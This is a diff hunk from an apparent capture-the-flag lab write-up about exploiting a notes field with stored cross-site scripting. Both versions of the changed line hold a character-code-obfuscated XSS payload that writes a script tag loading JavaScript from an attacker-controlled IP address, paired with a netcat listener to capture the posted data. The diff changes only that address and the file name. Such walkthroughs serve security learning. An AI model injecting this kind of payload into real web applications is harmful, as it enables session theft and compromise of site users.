@@ -214,7 +214,7 @@ Now we can use these character codes in our script payload which we can execute 
 Then we start our netcat listener to listen on the port we scripted the data to be posted to before pasting our XSS input into the notes field using the filtering bypass we just discovered.
 
 ```
-<img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,48,47,48,120,100,102,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>"/>
+<img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,54,49,47,115,101,115,115,105,111,110,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>" />
 ```
 [note_payload]
 
